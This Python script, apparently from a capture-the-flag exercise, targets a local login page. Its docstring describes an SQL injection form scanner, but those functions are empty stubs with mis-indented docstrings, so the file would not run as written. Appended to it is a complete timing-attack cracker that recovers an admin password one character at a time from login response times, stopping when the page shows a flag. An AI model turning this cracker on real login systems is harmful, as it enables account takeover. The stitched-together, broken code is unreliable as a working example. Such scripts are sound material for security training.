"""
SQL injection attack pentester.

Searches for input fields in the form of a site, and combinatorially posts singular inverted commas into the forms. Seeks out only forms with post actions.

Looks for error codes over 500 and reports them, with relevant input delivered.
"""

import string
import time
import requests
from bs4 import BeautifulSoup
import httplib2

URL      = "http://127.0.0.1:5000/login"
USERNAME = "admin"
SAMPLES  = 5         # measurements per candidate — increase if signal is noisy
CHARSET  = string.ascii_lowercase + string.digits

def get_fields():
    h = httplib2.Http('.cache')
    response, content = h.request(URL)
    forms = BeautifulSoup(content, 'lxml').find_all('form')

    # Characterising forms in HTML
    data={} #forms[action]=[input.name for input in inputs]
    
    for form in forms:
        method=form.get('method')
        action=form.get('action')
        if method == 'POST':
            data[action]=[field.get('name') for field in form.select('input')]
            
    print(data)

def generate_payloads(fields):
"""
Takes as input a list of fields of a given form, and generates a list of data payloads (dicts) containing SQL injection pentest loads of form {"name":" ' ", etc.} to be posted 
"""
#TODO



def check_vuln(resp, payload):
"""
Check a response code and flags a vulnerability, with payload used.
"""

def fire_payloads(URL, payload):



def measure(password: str) -> float:
    """Return the average response time (seconds) for a login attempt."""
    total = 0.0
    for _ in range(SAMPLES):
        start = time.perf_counter()
        requests.post(URL, data={"username": USERNAME, "password": password})
        total += time.perf_counter() - start
    return total / SAMPLES


def crack() -> str:
    known = ""

    while True:
        best_char  = None
        best_time  = 0.0

        for ch in CHARSET:
            guess = known + ch
            t = measure(guess)
            print(f"  {guess!r:<20} {t*1000:.1f} ms")
            if t > best_time:
                best_time = t
                best_char = ch

        known += best_char
        print(f"\n[+] prefix so far: {known!r}\n")

        # Confirm: if this prefix succeeds as the full password we are done.
        resp = requests.post(URL, data={"username": USERNAME, "password": known})
        if "Flag" in resp.text:
            print(f"[*] Password cracked: {known!r}")
            print(resp.text)
            return known


if __name__ == "__main__":
    get_fields()
